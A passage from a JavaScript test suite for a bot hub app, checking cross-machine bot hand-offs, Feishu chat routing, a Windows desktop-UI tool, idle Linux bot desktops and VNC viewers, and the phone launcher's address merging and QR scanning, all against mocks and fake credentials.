      if (req.url === '/api/bots') return send(200, [{ id: 'bot-w', name: '编剧', role: '写分镜' }, { id: 'bot-a', name: '美术', role: '画图' }]);
      if (req.url === '/api/uploads') { const name = decodeURIComponent(req.headers['x-file-name']); got.uploads.push({ name, text: body.toString() }); return send(200, { path: 'uploads/day/' + name }); }
      if (req.method === 'POST' && req.url === '/api/bots/bot-w/message') { got.messages.push(JSON.parse(body.toString())); return send(200, { turnId: 'turn-19' }); }
      if (req.url.startsWith('/api/bots/bot-w/messages')) return send(200, [{ turnId: 'turn-19', role: 'assistant', text: '写好了，在 out/synopsis.md，页面在 pages/board.html。' }, { turnId: 'turn-19', role: 'status', status: 'success' }]);
      if (req.url === '/api/workspace/file?path=' + encodeURIComponent('out/synopsis.md')) { res.writeHead(200); return res.end('梗概正文'); }
      send(404, {});
    });
    await new Promise((r) => srv19.listen(0, '127.0.0.1', r));
    const pdir = fsx.mkdtempSync(path.join(os.tmpdir(), 'peers19-'));
    const peers = createPeers({ file: path.join(pdir, 'peers.json') });
    await peers.set([{ name: 'Ubuntu', url: 'http://127.0.0.1:' + srv19.address().port, token: TOKEN }]);
    const ws = fsx.mkdtempSync(path.join(os.tmpdir(), 'ws19-'));
    fsx.mkdirSync(path.join(ws, 'notes'));
    fsx.writeFileSync(path.join(ws, 'notes', 'brief.md'), '主题：小猫');
    const r = await X.askPeerBot(peers, peers.find('Ubuntu'), { botId: 'bot-w', text: '按 notes/brief.md 写梗概（notes/missing.md 不存在）', workspaceDir: ws, pollMs: 20 });
    check('carry files: the files a hand-off names go along, and the bot there is told where they landed', got.uploads.length === 1 && got.uploads[0].name === 'brief.md' && got.uploads[0].text === '主题：小猫' && got.messages[0].text.includes('notes/brief.md → uploads/day/brief.md') && r.sent.length === 1);
    check('carry files: the files its answer names come back (pages stay there, the chat opens them)', r.fetched.length === 1 && r.fetched[0].from === 'out/synopsis.md' && fsx.readFileSync(path.join(ws, r.fetched[0].to), 'utf8') === '梗概正文' && r.fetched[0].to.startsWith('from-machines/Ubuntu/') && r.reply.includes('out/synopsis.md'));
    const T = await import('../src/tools.mjs');
    const reg = T.createRegistry({ workspaceDir: ws, config: { policy: {} }, getRuntime: () => null, getPeers: () => peers });
    const me = { id: 'chief', name: '助理', tools: ['bot_message'] };
    const out = await reg.get('bot_message').run({ machine: 'Ubuntu', botId: '编剧', text: '按 notes/brief.md 写梗概' }, { bot: me, depth: 0, chain: ['chief'], handoffBudget: { left: 5 }, workspaceDir: ws, bots: { getBot: async () => null } }).catch((e) => ({ err: e.message }));
    check('carry files: bot_message to another machine does both by itself and says where the results are', !out.err && out.filesSent?.[0]?.from === 'notes/brief.md' && out.filesFetched?.[0]?.to?.startsWith('from-machines/Ubuntu/') && /filesFetched/.test(out.note), out.err || '');
    // Members on other machines.
    const far = await X.resolveRemoteMember(peers, '编剧@ubuntu');
    const bare = await X.resolveRemoteMember(peers, '美术');
    check('groups: a bot on another machine is found by "name@machine", by id, or by a name only it has', far?.id === 'bot-w@Ubuntu' && far.info.name === '编剧' && bare?.id === 'bot-a@Ubuntu' && (await X.resolveRemoteMember(peers, 'bot-w@Ubuntu'))?.id === 'bot-w@Ubuntu' && (await X.resolveRemoteMember(peers, '不存在')) === null);
    const made = await api('/api/groups', { method: 'POST', body: { name: '跨机器测试群', members: ['chief', 'nobody@nowhere'] } });
    const farOnly = await api('/api/peers/bots');
    check('groups: an unknown far member is refused; the dialog can list who works on the other machines', made.status === 400 && made.json?.error?.code === 'GROUP_UNKNOWN_MEMBER' && farOnly.status === 200 && Array.isArray(farOnly.json?.machines));
    const G = await import('../src/groups.mjs');
    let needsLocal = '';
    try { await G.createGroup({ name: 'x', members: ['a@M', 'b@M'] }); } catch (e) { needsLocal = e.code; }
    let farCoord = '';
    try { await G.createGroup({ name: 'x', members: ['chief', 'a@M'], coordinatorId: 'a@M' }); } catch (e) { farCoord = e.code; }
    check('groups: the group needs a bot on this machine, and that one coordinates', needsLocal === 'GROUP_NEEDS_LOCAL' && farCoord === 'GROUP_BAD_COORDINATOR');
    // A far member takes its turn there and its answer is posted here under its name.
    const A = await import('../src/agent.mjs');
    const posted = [];
    const events = [];
    const fakeRt = {
      getPeers: () => peers,
      config: { workspaceDir: ws },
      groups: { readGroupMessages: async () => [{ kind: 'user', from: 'user', text: '大家进度如何' }, { kind: 'assistant', from: 'chief', text: '我这边好了 @编剧' }] },
      recordGroupMessage: async (gid, rec) => { posted.push(rec); return rec; },
      bus: { emit: (e) => events.push(e) },
    };
    got.messages.length = 0;
    const grp = { id: 'g1', name: '动画组', coordinatorId: 'chief', members: [{ id: 'chief', name: '助理', role: '协调' }, { id: 'bot-w@Ubuntu', name: '编剧', role: '写分镜', remote: { machine: 'Ubuntu', botId: 'bot-w' } }] };
    const origAsk = X.askPeerBot;
    const turn = await A.AgentRuntime.prototype.runRemoteGroupTurn.call(fakeRt, { group: grp, member: grp.members[1], text: '助理 在群里点名请你回答。用户原话：大家进度如何', role: 'speaker' });
    void origAsk;
    check('groups: a member on another machine answers there with the recent group talk, and is posted here under its name', turn.status === 'success' && got.messages[0]?.text.includes('动画组') && got.messages[0].text.includes('助理：我这边好了') && posted.at(-1)?.from === 'bot-w@Ubuntu' && posted.at(-1).kind === 'assistant' && posted.at(-1).text.includes('写好了') && posted.at(-1).text.includes('已经取回这台机器') && events.some((e) => e.type === 'turn.end' && e.groupId === 'g1'));
    const gone = await A.AgentRuntime.prototype.runRemoteGroupTurn.call({ ...fakeRt, getPeers: () => ({ find: () => null }) }, { group: grp, member: grp.members[1], text: 'x', role: 'speaker' });
    check('groups: a machine that cannot be reached says so in the group instead of hanging', gone.status === 'failed' && /没能联系上/.test(posted.at(-1).text));
    const agentSrc = await readText('../src/agent.mjs');
    check('groups: the group loop sends far members their turn; the coordinator is told who works elsewhere', agentSrc.includes('member.remote ? await this.runRemoteGroupTurn(') && agentSrc.includes('works on the machine'));
    // Feishu: "@name" reaches any bot.
    const FS = await import('../src/feishu.mjs');
    const { EventBus } = await import('../src/store.mjs');
    const fdir = fsx.mkdtempSync(path.join(os.tmpdir(), 'feishu19-'));
    const sent = [];
    const fakeFetch = async (url, init = {}) => {
      const ok = (data) => ({ ok: true, status: 200, json: async () => ({ code: 0, ...data }) });
      if (url.includes('tenant_access_token')) return ok({ tenant_access_token: 't', expire: 7200 });
      if (url.includes('/im/v1/messages')) { const c = JSON.parse(JSON.parse(init.body).content); sent.push(c.zh_cn?.content?.[0]?.[0]?.text || ''); return ok({ data: {} }); }
      return ok({ data: {} });
    };
    const turns = [];
    const asked = [];
    const fzBus = new EventBus();
    const fz = FS.createFeishu({
      file: path.join(fdir, 'feishu.json'), bus: fzBus, workspaceDir: fdir, fetchImpl: fakeFetch,
      runtime: { runTurn: async (t) => { turns.push(t); return t; } },
      approvals: { resolve: () => {} },
      getBots: () => [{ id: 'chief', name: '助理', primary: true }, { id: 'bot-ed', name: '剪辑' }],
      machineName: () => '本机',
      resolveRemote: (ref) => X.resolveRemoteMember(peers, ref),
      listRemote: () => peers.rosters(),
      askRemote: async (q) => { asked.push(q); return { reply: '梗概写好了', fetched: [] }; },
    });
    await fz.load();
    await fz.update({ appId: 'cli_19', appSecret: 'sec-19' });
    let n = 0;
    const say = async (text) => { n += 1; fz._handleFrame(FS.encodeFrame({ method: 1, headers: [{ key: 'type', value: 'event' }, { key: 'message_id', value: 'z' + n }], payload: Buffer.from(JSON.stringify({ header: { event_id: 'ze' + n, event_type: 'im.message.receive_v1' }, event: { sender: { sender_id: { open_id: 'ou_19' }, sender_type: 'user' }, message: { message_id: 'zm' + n, chat_id: 'oc_19', chat_type: 'p2p', message_type: 'text', content: JSON.stringify({ text }) } } })) })); await new Promise((r) => setTimeout(r, 60)); };
    await say('配对 ' + fz.view().pairCode);
    await say('@剪辑 把片头剪短一点');
    check('feishu: "@name" goes straight to that bot on this machine, without the @name', turns.at(-1)?.botId === 'bot-ed' && turns.at(-1).text.startsWith('把片头剪短一点'));
    await say('@编剧 写一个梗概');
    check('feishu: a name that lives on another machine is asked there, and the answer comes back to Feishu', asked.at(-1)?.machine === 'Ubuntu' && asked.at(-1).botId === 'bot-w' && asked.at(-1).text === '写一个梗概' && sent.some((t) => /已转给「Ubuntu」上的编剧/.test(t)) && sent.some((t) => /^【编剧 · Ubuntu】\n梗概写好了/.test(t)) && turns.length === 1);
    // Batch I (Notion §97.6): the person keeps talking to whoever they named last.
    await say('再写短一点');
    check('feishu: after "@编剧", the next message without "@" still goes to 编剧 on Ubuntu', asked.at(-1)?.botId === 'bot-w' && asked.at(-1).text === '再写短一点' && turns.length === 1);
    const saved = JSON.parse(fsx.readFileSync(path.join(fdir, 'feishu.json'), 'utf8'));
    check('feishu: who the person talks to is saved (survives a restart)', saved.users[0]?.target?.botId === 'bot-w' && saved.users[0].target.machine === 'Ubuntu');
    await say('/home');
    check('feishu: "/home" goes back to the primary bot', /接下来发给 助理（本机）/.test(sent.at(-1) || '') && !JSON.parse(fsx.readFileSync(path.join(fdir, 'feishu.json'), 'utf8')).users[0].target);
    await say('@某个不存在的 你好');
    check('feishu: an unknown @name is just a message for the current bot', turns.at(-1)?.botId === 'chief' && turns.at(-1).text.startsWith('@某个不存在的 你好'));
    fzBus.emit({ type: 'message', turnId: turns.at(-1).turnId, text: '你好呀' });
    fzBus.emit({ type: 'turn.end', turnId: turns.at(-1).turnId, botId: 'chief', status: 'success' });
    await new Promise((r) => setTimeout(r, 60));
    check('feishu: an answer starts with who is talking', sent.some((t) => t === '【助理 · 本机】\n你好呀'));
    await say('切换');
    const menu = sent.at(-1) || '';
    check('feishu: "切换" lists every bot, this machine first, with the current one marked', /1. 助理（本机） ← 现在/.test(menu) && /2. 剪辑（本机）/.test(menu) && /3. 编剧（Ubuntu）/.test(menu));
    await say('2');
    await say('把结尾也剪一下');
    check('feishu: a number after "切换" switches, and the next message goes there', sent.some((t) => /接下来发给 剪辑（本机）/.test(t)) && turns.at(-1)?.botId === 'bot-ed' && turns.at(-1).text.startsWith('把结尾也剪一下'));
    await say('9');
    check('feishu: a bare number with no list open is just a message', turns.at(-1)?.botId === 'bot-ed' && turns.at(-1).text.startsWith('9'));
    await say('机器人列表');
    check('feishu: "机器人列表" says who can be reached, on which machine', /这台机器：助理、剪辑/.test(sent.at(-1) || '') && /「Ubuntu」：编剧、美术/.test(sent.at(-1)));
    fz.stop();
    srv19.close();

    // Batch I2: a Feishu app of its own, bound to one bot.
    const pinDir = fsx.mkdtempSync(path.join(os.tmpdir(), 'feishu-pin-'));
    const pTurns = [];
    const pAsked = [];
    const pSent = [];
    const pFetch = async (url, init = {}) => {
      const ok = (data) => ({ ok: true, status: 200, json: async () => ({ code: 0, ...data }) });
      if (url.includes('tenant_access_token')) return ok({ tenant_access_token: 't', expire: 7200 });
      if (url.includes('/im/v1/messages')) { const c = JSON.parse(JSON.parse(init.body).content); pSent.push(c.zh_cn?.content?.[0]?.[0]?.text || ''); return ok({ data: {} }); }
      return ok({ data: {} });
    };
    const mkPinned = (pinned, file) => FS.createFeishu({
      file, bus: new EventBus(), workspaceDir: pinDir, fetchImpl: pFetch,
      runtime: { runTurn: async (t) => { pTurns.push(t); return t; } },
      approvals: { resolve: () => {} },
      getBots: () => [{ id: 'chief', name: '助理', primary: true }, { id: 'bot-ed', name: '剪辑' }],
      machineName: () => '本机',
      askRemote: async (q) => { pAsked.push(q); return { reply: '分镜画好了', fetched: [] }; },
      pinned,
    });
    const pz = mkPinned({ botId: 'bot-ed', machine: '', name: '剪辑' }, path.join(pinDir, 'a.json'));
    await pz.load();
    await pz.update({ appId: 'cli_pin', appSecret: 'sec-pin' });
    let pn = 0;
    const psay = async (inst, text, extra = {}) => { pn += 1; inst._handleFrame(FS.encodeFrame({ method: 1, headers: [{ key: 'type', value: 'event' }, { key: 'message_id', value: 'p' + pn }], payload: Buffer.from(JSON.stringify({ header: { event_id: 'pe' + pn, event_type: 'im.message.receive_v1' }, event: { sender: { sender_id: { open_id: 'ou_p' }, sender_type: 'user' }, message: { message_id: 'pm' + pn, chat_id: 'oc_p', chat_type: 'p2p', message_type: 'text', content: JSON.stringify({ text }), ...extra } } })) })); await new Promise((r) => setTimeout(r, 60)); };
    await psay(pz, '配对 ' + pz.view().pairCode);
    check('feishu app of its own: pairing says which bot it is', /已连接到「本机」的剪辑/.test(pSent.at(-1) || ''));
    await psay(pz, '@助理 切换');
    check('feishu app of its own: every message goes to its bot; "@" and "切换" are just text', pTurns.at(-1)?.botId === 'bot-ed' && pTurns.at(-1).text.startsWith('@助理 切换'));
    const pinBefore = pTurns.length;
    await psay(pz, '大家看看', { chat_type: 'group', chat_id: 'oc_g' });
    await psay(pz, '剪一下片头', { chat_type: 'group', chat_id: 'oc_g', mentions: [{ key: '@_user_1' }] });
    check('feishu app of its own: in a group it answers only when @-mentioned', pTurns.length === pinBefore + 1 && pTurns.at(-1).text.startsWith('剪一下片头'));
    pz.dispose();
    const pr = mkPinned({ botId: 'bot-w', machine: 'Ubuntu', name: '美术' }, path.join(pinDir, 'b.json'));
    await pr.load();
    await pr.update({ appId: 'cli_pin2', appSecret: 'sec-pin2' });
    await psay(pr, '配对 ' + pr.view().pairCode);
    await psay(pr, '画个分镜');
    check('feishu app of its own: a bot on another machine is asked there; no 【】 label on its own app', pAsked.at(-1)?.machine === 'Ubuntu' && pAsked.at(-1).botId === 'bot-w' && pSent.at(-1) === '分镜画好了' && pr.view().pinned?.name === '美术');
    pr.dispose();
    const appsNone = await api('/api/feishu/apps');
    const appsBadBot = await api('/api/feishu/apps', { method: 'POST', body: { bot: 'no-such-bot', appId: 'cli_x', appSecret: 's' } });
    const appsNoKeys = await api('/api/feishu/apps', { method: 'POST', body: { bot: 'chief' } });
    const appsGone = await api('/api/feishu/apps/fa-nope', { method: 'DELETE' });
    check('feishu apps of their own: API lists none at first, refuses an unknown bot or missing keys, 404 for an unknown app', Array.isArray(appsNone.json?.apps) && appsNone.json.apps.length === 0 && appsBadBot.status === 400 && appsNoKeys.status === 400 && appsGone.status === 404);

    // Batch J (Notion §97): bots on one Windows desktop, light and idle Linux desktops.
    {
      const W = await import('../src/winui.mjs');
      const { EventEmitter } = await import('node:events');
      const calls = [];
      const fakeSpawn = (cmd, args, opts) => {
        calls.push({ cmd, args, env: opts.env });
        const child = new EventEmitter();
        child.stdout = new EventEmitter();
        child.stderr = new EventEmitter();
        child.kill = () => {};
        const req = JSON.parse(Buffer.from(opts.env.DESK_WINUI, 'base64').toString('utf8'));
        setTimeout(() => {
          if (req.window === 'nope') { child.stderr.emit('data', '#< CLIXML <S S="Error">NO_WINDOW_x000D__x000A_</S>'); child.emit('close', 1); return; }
          child.stdout.emit('data', JSON.stringify({ window: req.window, text: 'hello' }));
          child.emit('close', 0);
        }, 5);
        return child;
      };
      fakeSpawn.fake = true;
      const read = await W.runWinUi({ action: 'read', window: '记事本' }, { spawnImpl: fakeSpawn });
      const sent = JSON.parse(Buffer.from(calls[0].env.DESK_WINUI, 'base64').toString('utf8'));
      check('desktop_ui: the request goes in as base64 JSON, the script as -EncodedCommand (nothing parsed as PowerShell)', read.text === 'hello' && sent.window === '记事本' && calls[0].args.includes('-EncodedCommand') && !calls[0].args.join(' ').includes('记事本'));
      let missing = '';
      try { await W.runWinUi({ action: 'read', window: 'nope' }, { spawnImpl: fakeSpawn }); } catch (err) { missing = err.message; }
      check('desktop_ui: a missing window comes back as advice in plain words', /找不到标题里含「nope」的窗口/.test(missing));
      let bad = '';
      try { await W.runWinUi({ action: 'format_disk' }, { spawnImpl: fakeSpawn }); } catch (err) { bad = err.message; }
      check('desktop_ui: only the five actions exist', /不认识的操作/.test(bad) && W.WINUI_ACTIONS.join(',') === 'windows,controls,click,type,read');
      const toolsSrc = await readText('../src/tools.mjs');
      check('desktop_ui: looking is low risk, pressing and typing are medium (approval rules apply)', toolsSrc.includes("name: 'desktop_ui'") && toolsSrc.includes("args?.action === 'click' || args?.action === 'type' ? { risk: RISK.MEDIUM } : { risk: RISK.LOW }"));
      const botsSrc = await readText('../src/bots.mjs');
      check('desktop_ui: the primary bot gets it on upgrade (seed grants version 5)', /chief: \{\s*version: 5,/.test(botsSrc) && botsSrc.includes("'desktop_ui',"));
      const B = await import('../src/browser.mjs');
      const launch = B.buildLaunchArgs({ port: 9, profileDir: 'x' });
      check('browsers: a covered or minimised bot window keeps full speed', ['--disable-backgrounding-occluded-windows', '--disable-renderer-backgrounding', '--disable-background-timer-throttling'].every((a) => launch.includes(a)));

      const D = await import('../src/desktops.mjs');
      const closedBrowsers = [];
      D.setDesktopHooks({ busy: (id) => id === 'busy-bot', beforeStop: async (id) => { closedBrowsers.push(id); } });
      const old = Date.now() - D.DESKTOP_IDLE_MS - 60000;
      D._testAddDesktop('idle-bot', { lastUsed: old });
      D._testAddDesktop('watched-bot', { lastUsed: old, viewers: 1 });
      D._testAddDesktop('busy-bot', { lastUsed: old });
      D._testAddDesktop('fresh-bot', { lastUsed: Date.now() });
      const stopped = await D.reapIdleDesktops();
      check('desktops: only the one nobody used for 15 minutes stops, its browser closed first; watched, busy and fresh ones stay', stopped.join(',') === 'idle-bot' && closedBrowsers.join(',') === 'idle-bot' && D.listDesktops().map((d) => d.botId).sort().join(',') === 'busy-bot,fresh-bot,watched-bot');
      const leave = D.desktopViewerOpened('watched-bot');
      leave(); leave();
      const watched = D._testDesktopEntry('watched-bot');
      check('desktops: a viewer leaving counts once', watched.viewers === 1);
      for (const id of ['watched-bot', 'busy-bot', 'fresh-bot']) D.stopDesktop(id);
      D.setDesktopHooks({ busy: () => false, beforeStop: async () => {} });
      {
        // N3: the VNC part (x11vnc + websockify / wayvnc) runs only while someone watches.
        const fakeProc = () => ({ killed: false, exitCode: null, kill() { this.killed = true; } });
        let starts = 0;
        const startViewer = async () => { starts += 1; return [fakeProc(), fakeProc()]; };
        const longAgo = Date.now() - D.VIEWER_IDLE_MS - 1000;
        D._testAddDesktop('view-idle', { procs: [fakeProc()], webPort: 1, startViewer, viewProcs: [fakeProc(), fakeProc()], lastViewerAt: longAgo });
        D._testAddDesktop('view-watched', { procs: [fakeProc()], webPort: 1, startViewer, viewProcs: [fakeProc()], lastViewerAt: longAgo, viewers: 1 });
        D._testAddDesktop('view-recent', { procs: [fakeProc()], webPort: 1, startViewer, viewProcs: [fakeProc()], lastViewerAt: Date.now() });
        const idleViewers = D.reapIdleViewers();
        const idleEntry = D._testDesktopEntry('view-idle');
        check('N3 screens: nobody watching for 2 minutes stops only the VNC part; the screen keeps running; watched and recent ones stay',
          idleViewers.join(',') === 'view-idle' && idleEntry.viewProcs.length === 0 && idleEntry.procs.every((p) => !p.killed)
          && D._testDesktopEntry('view-watched').viewProcs.every((p) => !p.killed) && D._testDesktopEntry('view-recent').viewProcs.every((p) => !p.killed));
        await D.ensureViewer('view-idle');
        check('N3 screens: opening the screen starts the VNC part again', starts === 1 && D._testDesktopEntry('view-idle').viewProcs.length === 2);
        const builderYml = await readText('../desktop/electron-builder.yml');
        check('packaging: the desktop build ships src/vendor (.cjs + licence), not only .mjs - the hub would not start without jpeg-js', builderYml.includes('filter: ["**/*.mjs", "**/*.cjs", "**/LICENSE"]'));
        const deskSrc = await readText('../src/desktops.mjs');
        const relaySrc = await readText('../src/server.mjs');
        check('N3 screens: x11 and wayland screens start without VNC; the relay starts it before connecting; liveness ignores the VNC part',
          deskSrc.includes('const startViewer = async () => {') && deskSrc.split('const startViewer = async () => {').length === 3
          && relaySrc.includes('void ensureViewer(safeDecode(match[1])).catch(() => false).then((ok) => {')
          && deskSrc.includes('if (existing.procs.every(alive)) { existing.lastUsed = Date.now();'));
        for (const id of ['view-idle', 'view-watched', 'view-recent']) D.stopDesktop(id);
      }

      const modes = await api('/api/desktops');
      const toFull = await api('/api/desktops/mode', { method: 'PUT', body: { mode: 'full' } });
      const toOdd = await api('/api/desktops/mode', { method: 'PUT', body: { mode: 'gnome' } });
      check('desktops: light by default; full can be chosen; anything else means light; idle minutes reported', modes.json?.mode === 'light' && modes.json.idleMinutes === 15 && toFull.json?.mode === 'full' && toOdd.json?.mode === 'light');
      const page = await readText('../public/index.html');
      check('desktops: the light/full switch is in Settings → 机器 and wired', page.includes('id="desktop-mode"') && page.includes("$('desktop-mode')?.addEventListener('change', saveDesktopMode)") && page.includes('loadDesktopMode().catch'));
      const setup = await readText('../hub/setup-linux.sh');
      check('desktops: new Linux machines get openbox for light desktops', setup.includes('has openbox || pm_install openbox x11-xserver-utils') && setup.includes('has openbox || pm_install openbox xsetroot'));
      check('desktops: new Linux machines no longer install XFCE; the bot session falls back to openbox without it', !/pm_install xfce4|groupinstall "Xfce"/.test(setup) && setup.includes('exec openbox') && !/for bin in Xvfb x11vnc websockify xfce4-session/.test(setup));
      const deskSrc = await readText('../src/desktops.mjs');
      {
        // Batch K: Rocky/RHEL 10 have no Xvfb/x11vnc; their bot screens are cage + wayvnc.
        const wl = D.waylandCommands({ display: 121, vncPort: 5921, webPort: 6101 });
        check('desktops (Rocky 10): a Wayland screen is headless cage + wayvnc speaking WebSocket itself on 127.0.0.1 (no websockify fork per viewer)', wl.cage[0] === 'cage' && wl.cage[1].join(' ') === '-d -- sleep 2147121000' && wl.vnc[1].join(' ') === '-w -r 127.0.0.1 6101' && !wl.web && deskSrc.includes("WLR_BACKENDS: 'headless'") && deskSrc.includes("mode: 'kiosk'"));
        const wlArgs = B.buildLaunchArgs({ port: 9, profileDir: 'x', wayland: true });
        const brSrc = await readText('../src/browser.mjs');
        check('desktops (Rocky 10): the bot browser draws natively on its Wayland screen, without an X display', wlArgs.includes('--ozone-platform=wayland') && !B.buildLaunchArgs({ port: 9, profileDir: 'x' }).includes('--ozone-platform=wayland') && brSrc.includes('delete launchEnv.DISPLAY'));
        check('desktops (Rocky 10): the installer sets up cage + wayvnc on EL 10, fixes liblc3, and counts it as a complete desktop', setup.includes('pm_install cage wayvnc python3-websockify novnc') && setup.includes('upgrade liblc3') && setup.includes('has cage && has wayvnc && wayvnc --version') && !setup.includes('status unsupported'));
        check('desktops (Rocky 10): the empty kiosk screen explains itself and Settings hides the light/full switch there', page.includes("mode === 'kiosk' ?") && page.includes("r.support?.backend !== 'wayland'"));
      }
      check('desktops: the empty-screen note sits under the screen (on top it covered an open browser), and a restarted bot browser does not ask to restore pages', page.indexOf('id="pc-light-hint"') > page.indexOf('id="pc-vnc-shield"') && page.indexOf('id="pc-light-hint"') < page.indexOf('id="pc-mobile-bar"') && !/.pc-light-hint {[^}]*position: absolute/.test(page) && B.buildLaunchArgs({ port: 9, profileDir: 'x' }).includes('--hide-crash-restore-bubble'));
      {
        const dsrc = await readText('../src/desktops.mjs');
        const bsrc = await readText('../src/browser.mjs');
        check('desktops: overlapping requests share one start of a bot screen (they used to kill each other)', dsrc.includes('if (starting.has(botId)) return starting.get(botId);') && dsrc.includes('async function ensureDesktopOnce(botId) {'));
        check('desktops (Rocky 10): a browser that dies right after starting on a Wayland screen gets the screen restarted and one more launch', bsrc.includes('if (child.exitCode !== null || child.signalCode) {') && bsrc.includes('desk.stopDesktop(this.key);'));
      }
      {
        const pageN = await readText('../public/index.html');
        const brN = await import('../src/browser.mjs');
        const launcherN = await readText('../mobile/shell/launcher.js');
        const mainN = await readText('../desktop/main.mjs');
        const srvN = await readText('../src/server.mjs');
        check('N1: a visible bot browser has no "unsupported command-line flag" bar; Wayland still gets its flags', brN.buildLaunchArgs({ port: 9, profileDir: 'x' }).includes('--test-type') && !brN.buildLaunchArgs({ port: 9, profileDir: 'x', headless: true }).includes('--test-type') && brN.buildLaunchArgs({ port: 9, profileDir: 'x', wayland: true }).includes('--ozone-platform=wayland'));
        check('N1: a phone settings page does not repeat its title under the top bar', pageN.includes('.settings-modal:not(.set-home) #settings-scroll > .dsec > .dsec-head:first-child { display: none; }'));
        check('N1: each machine learns the name it was given and uses it everywhere; the computer joins every list with a login of its own', srvN.includes("if (typeof body?.self?.name === 'string' && body.self.name.trim()) setSelfMachineName(body.self.name);") && srvN.includes('name: selfMachineName(),') && mainN.includes('const body = t.local ? { peers: others } : { peers: others, self: { name: t.name } };') && mainN.includes("deviceName: '其他机器（同步用）'") && mainN.includes('if (!t.local && self) others.unshift(self);'));
        check('N1: the phone keeps one row per machine (either address), takes the hub name, drops stale rows, and opens by the other address when one is down', launcherN.includes('const matches = list.filter((h) => urls.includes(h.url));') && launcherN.includes('if (machine.name) keep.name = machine.name;') && launcherN.includes("list = list.filter((h) => !(h.via === entry.url && !listed.has(h.url)") && launcherN.includes('bestAddress([entry.url, ...(entry.alt || [])])') && launcherN.includes('await rememberHub(entry.url);'));
      }
      {
        // The phone's real merge, run on a list like the one a phone had: one
        // machine saved under two addresses, an old hostname, a stale address.
        const lsrc = await readText('../mobile/shell/launcher.js');
        const grab = (name) => {
          const i = lsrc.indexOf('function ' + name + '('); const start = lsrc.lastIndexOf('\n', i) + 1;
          let depth = 0; let j = lsrc.indexOf('{', i);
          for (; j < lsrc.length; j++) { if (lsrc[j] === '{') depth++; else if (lsrc[j] === '}' && --depth === 0) break; }
          return lsrc.slice(start, j + 1);
        };
        const HUB = 'http://hub.test:4390';
        const mem = new Map([
          ['desk.hubs', JSON.stringify([
            { url: HUB, name: 'pc' },
            { url: 'http://old-addr.test:4390', name: 'localhost.localdomain', via: HUB },
            { url: 'http://rocky-lan.test:4390', name: 'Rocky', via: HUB },
            { url: 'http://rocky-ts.test:4390', name: 'localhost.localdomain', via: HUB },
            { url: 'http://win11-ts.test:4390', name: 'win11', via: HUB },
            { url: 'http://win11-lan.test:4390', name: 'win11', via: HUB },
          ])],
          ['desk.token:' + HUB, 't'],
        ]);
        const store = { get: async (k) => mem.get(k) ?? null, set: async (k, v) => mem.set(k, v), remove: async (k) => mem.delete(k) };
        const KEYS = { hub: 'desk.hubUrl', hubs: 'desk.hubs', tokenFor: (h) => 'desk.token:' + h };
        const fakeFetch = async () => ({ ok: true, json: async () => ({ machines: [
          { name: 'LAPTOP', self: true, url: HUB },
          { name: 'Rocky', url: 'http://rocky-lan.test:4390', tailnetUrl: 'http://rocky-ts.test:4390' },
          { name: 'win11', url: 'http://win11-lan.test:4390', tailnetUrl: 'http://win11-ts.test:4390' },
        ] }) });
        const merge = new Function('store', 'KEYS', 'fetch', 'renderMachines', [grab('hostLabel'), grab('readHubs'), grab('mergePeerMachines')].join('\n') + '\nreturn mergePeerMachines();');
        await merge(store, KEYS, fakeFetch, async () => {});
        const rows = JSON.parse(mem.get('desk.hubs'));
        check('phone list: one row per machine with its other address kept, the hub names win, stale addresses go', rows.length === 3 && rows.map((r) => r.name).join(',') === 'LAPTOP,Rocky,win11' && rows.find((r) => r.name === 'Rocky').alt?.length === 1 && !rows.some((r) => r.name === 'localhost.localdomain'));
      }
      {
        // N2: scanning without Google - our own pairing code, read back by the vendored jsQR.
        const vm = await import('node:vm');
        const box = { window: {}, self: {} };
        box.self = box.window;
        vm.createContext(box);
        vm.runInContext(await readText('../public/vendor/qrcode.js') + '\nwindow.qrcode = qrcode;', box);
        vm.runInContext(await readText('../mobile/shell/jsqr.js'), box);
        const jsQR = box.jsQR || box.window.jsQR || box.self.jsQR;
        const link = 'http://hub.test:4390/?pair=abcDEF123456';
        const qr = box.window.qrcode(0, 'M');
        qr.addData(link);
        qr.make();
        const n = qr.getModuleCount();
        const scale = 6;
        const quiet = 4;
        const size = (n + quiet * 2) * scale;
        const px = new Uint8ClampedArray(size * size * 4).fill(255);
        for (let r = 0; r < n; r += 1) for (let c = 0; c < n; c += 1) {
          if (!qr.isDark(r, c)) continue;
          for (let y = 0; y < scale; y += 1) for (let x = 0; x < scale; x += 1) {
            const i = (((r + quiet) * scale + y) * size + (c + quiet) * scale + x) * 4;
            px[i] = 0; px[i + 1] = 0; px[i + 2] = 0;
          }
        }
        const read = typeof jsQR === 'function' ? jsQR(px, size, size) : null;
        const launcherS = await readText('../mobile/shell/launcher.js');
        const shellS = await readText('../mobile/shell/index.html');
        check('N2 scan: a pairing code the hub draws is read back by the in-app scanner (jsQR, no Google module)', read?.data === link);
        check('N2 scan: the back key and 取消 both close the camera', launcherS.includes("history.pushState({ scan: true }, '');") && launcherS.includes("window.addEventListener('popstate', onBack);") && launcherS.includes('stream.getTracks().forEach((t) => t.stop());'));
        check('auto address: the phone probes every address at once and keeps the closest that answers (LAN, then Tailscale, then public), for scanning and for opening a machine', launcherS.includes('async function bestAddress(urls)') && launcherS.includes("url.searchParams.getAll('alt')") && launcherS.includes('let hub = (await bestAddress([entry.url, ...(entry.alt || [])])) || entry.url;'));
        check('auto address: each row is labelled by the address that answers now (局域网 / Tailscale)', launcherS.includes('if (best) { url.textContent = linkKind(best); url.title = best; }'));
        check('auto address: the row shows how it was reached last time while checking, and remembers the new one', launcherS.includes('url.textContent = linkKind(entry.best || entry.url);') && launcherS.includes('row.best = best;'));
        check('phone list: the 15 s redraw keeps the last state (no 检测中 flashing), and a relayed Tailscale address gets a second, longer try before 离线', launcherS.includes('const known = renderMachines.lastUp?.get(entry.url);') && launcherS.includes('const again = await Promise.all(slow.map((u) => probe(u, 10000)));') && launcherS.includes('async function probe(hub, timeoutMs = PROBE_TIMEOUT_MS) {'));
        check('N2 list: a VM only the computer can reach says 仅电脑可达 and explains, instead of 离线', launcherS.includes('async function behindVia(entry)') && launcherS.includes("tag.textContent = '仅电脑可达';") && launcherS.includes('手机直接连不到'));
        check('N2 scan: Google scanner when the phone has it, otherwise the camera inside the app', launcherS.includes('useGoogle = await ensureBarcodeModule().catch(() => false);') && launcherS.includes('const text = await cameraScan();') && shellS.includes('id="scan-view"') && launcherS.includes("tag.src = 'jsqr.js';"));
        const pageT = await readText('../public/index.html');
